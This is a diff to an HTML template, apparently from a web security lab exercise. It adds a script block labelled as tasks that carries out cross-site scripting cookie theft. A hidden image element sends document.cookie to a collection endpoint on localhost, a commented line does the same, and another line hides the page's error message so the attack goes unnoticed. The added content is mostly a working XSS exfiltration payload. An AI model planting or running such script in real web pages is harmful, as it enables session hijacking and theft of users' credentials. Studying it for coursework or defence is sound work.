@@ -41,5 +41,21 @@
     <input class="form-button" type="submit" value="Update"/>
   </form>
 </div>
+
+<script>
+  //Task 2.1
+  // alert(document.cookie)
+  // document.createElement("img").src = "http://localhost:8080/profile/my_attack_with_cookie=" + document.cookie;
+  
+  //Task 2.2
+  attack = document.createElement("img");
+  attack.setAttribute("src", "http://localhost:8081/xss_out?stolen_cookie="+ document.cookie);
+  attack.setAttribute("hidden", true);
+
+  //Task 2.3
+  document.getElementsByClassName("error")[0].style.visibility = "hidden";
+
+</script>
+
 {% endif %}
 {% endblock %}
